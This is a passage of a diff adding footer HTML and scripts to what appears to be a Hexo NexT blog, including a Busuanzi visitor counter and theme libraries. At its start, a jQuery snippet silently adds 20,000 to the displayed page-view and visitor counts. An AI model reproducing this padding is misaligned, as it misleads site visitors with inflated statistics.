+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+</body>
+</html>
